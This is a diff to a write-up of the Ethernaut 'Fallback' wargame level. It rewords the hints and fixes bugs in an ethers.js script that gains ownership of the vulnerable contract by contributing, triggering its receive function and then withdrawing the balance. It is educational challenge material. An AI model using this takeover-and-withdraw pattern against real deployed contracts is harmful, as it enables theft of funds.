@@ -14,7 +14,7 @@ The goal of [this level](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD44
 
 <summary>Hint One</summary>
 
-Before we can withdraw funds, we must first become the contract's `owner`. Where in the code is the owner variable first assigned? Where is it reassigned? When it is reassigned, what conditions need to be met that would result in `msg.sender` becoming the `owner`? Could we construct a series of transactions to meet these conditions?
+Before you can withdraw funds, you must first become the contract's `owner`. Where in the code is the owner variable first assigned? Where is it reassigned? When it is reassigned, what conditions need to be met that would result in `msg.sender` becoming the owner? Could you construct a series of transactions to meet these conditions?
 
 </details>
 
@@ -22,7 +22,7 @@ Before we can withdraw funds, we must first become the contract's `owner`. Where
 
 <summary>Hint Two</summary>
 
-We can become the contract `owner` by triggering its `receive` function after making an initial transaction via the `contribute` function to satisfy the second part of its `require(msg.value > 0 && contributions[msg.sender] > 0);` condition. The `receive` function is a special "fallback" function in Solidity. How is it triggered?
+You can become the contract owner by triggering its `receive` function after making an initial transaction via `contribute` to satisfy the second part of its `require(msg.value > 0 && contributions[msg.sender] > 0);` condition. The receive function is a special "fallback" function in Solidity. How is it triggered?
 
 </details>
 
@@ -75,12 +75,12 @@ function withdraw() public onlyOwner {
 ### Scripted Solution
 
 ```javascript
-const ethers = require('ethers')
 const fs = require('fs')
+const ethers = require('ethers')
 require('dotenv').config({ path: './.env' })
 
 /**
- * Initialize Ethers objects needed to interact with the blockchain and 
+ * Initialize Ethers objects needed to interact with the blockchain and
  * contract.
  */
 async function setup(contractName) {
@@ -89,7 +89,7 @@ async function setup(contractName) {
   // Create player wallet
   const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
   // Create player wallet signer - an abstraction of an Ethereum account
-  const playerWalletSigner = await wallet.connect(provider)
+  const playerWalletSigner = await playerWallet.connect(provider)
   // Create contract instance - an abstraction of the deployed contract code
   const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
   const contract = new ethers.Contract(
@@ -111,18 +111,17 @@ async function main() {
     playerWallet,
     playerWalletSigner,
     contract: fallbackContract,
-  } = setup('Fallback')
+  } = await setup('Fallback')
 
   // Contribute 0.0001 ether via Fallback contract's 'contribute' function
   const contributionValue = ethers.utils.parseEther('0.0001')
   console.log(
     `Sending Fallback 'contribute' ${contributionValue.toString()}...`
   )
-  await fallbackContract
-    .contribute({
-      value: contributionValue,
-    })
-    .wait(1)
+  const fallbackContribute = await fallbackContract.contribute({
+    value: contributionValue,
+  })
+  await fallbackContribute.wait(1)
 
   // Confirm contribution via Fallback contract's 'getContribution' function
   console.log(
@@ -135,13 +134,12 @@ async function main() {
   console.log(
     `Sending ${contributionValue.toString()} to Fallback contract address...`
   )
-  await playerWalletSigner
-    .sendTransaction({
-      to: process.env.CONTRACT_ADDRESS,
-      value: contributionValue,
-      gasPrice: 20000000000,
-    })
-    .wait(1)
+  const fallbackReceive = await playerWalletSigner.sendTransaction({
+    to: process.env.CONTRACT_ADDRESS,
+    value: contributionValue,
+    gasPrice: 20000000000,
+  })
+  await fallbackReceive.wait(1)
 
   // Check current Fallback contract 'owner'
   const fallbackContractOwner = await fallbackContract.owner()
@@ -152,7 +150,8 @@ async function main() {
 
     // Withdraw funds via Fallback contract's 'withdraw' function
     console.log('Withdrawing contract balance...')
-    await fallbackContract.withdraw().wait(1)
+    const fallbackWithdraw = await fallbackContract.withdraw()
+    await fallbackWithdraw.wait(1)
 
     // Check new Fallback contract balance
     const contractBalance = await provider.getBalance(
